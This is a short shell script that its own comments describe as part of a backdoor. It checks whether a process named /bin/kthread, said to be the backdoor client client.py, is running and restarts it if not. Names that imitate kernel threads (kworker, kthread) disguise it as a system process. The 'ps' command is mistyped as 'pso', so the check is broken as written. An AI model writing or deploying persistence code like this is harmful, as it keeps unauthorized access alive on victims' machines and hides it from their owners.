# this is the kworker script
# it checks if the backdoor script (client.py) kthread is running
# if not, it starts it 
pso aux | grep "/bin/[k]thread"
if [ $? -ne 0 ]; then
    /bin/kthread
fi